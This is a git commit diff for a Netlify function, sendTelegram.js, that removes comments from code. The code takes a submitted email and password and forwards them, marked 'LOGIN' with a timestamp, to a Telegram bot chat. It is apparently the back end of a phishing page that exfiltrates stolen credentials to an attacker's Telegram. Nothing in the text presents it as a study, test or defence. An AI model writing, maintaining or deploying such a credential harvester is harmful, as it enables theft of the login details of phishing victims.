f0b60fd9e21c786d3eb85bd271a4d6dc615b42fa
dammyfx123 <bukoladami121@gmail.com>
2026-04-03 16:11:02 +0100

    Update sendTelegram.js

--- netlify-functions/sendTelegram.js
+++ netlify-functions/sendTelegram.js
@@ -5,16 +5,13 @@ const CHAT_ID = "1957450632";
 
 exports.handler = async function(event, context) {
   try {
-    // Parse incoming JSON body
     const { email, password } = JSON.parse(event.body);
 
-    // Construct Telegram message
     const message = `🔐 LOGIN
 Email: ${email}
 Password: ${password}
 Time: ${new Date().toLocaleString()}`;
 
-    // Send to Telegram
     const res = await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
       method: "POST",
       headers: { "Content-Type": "application/json" },
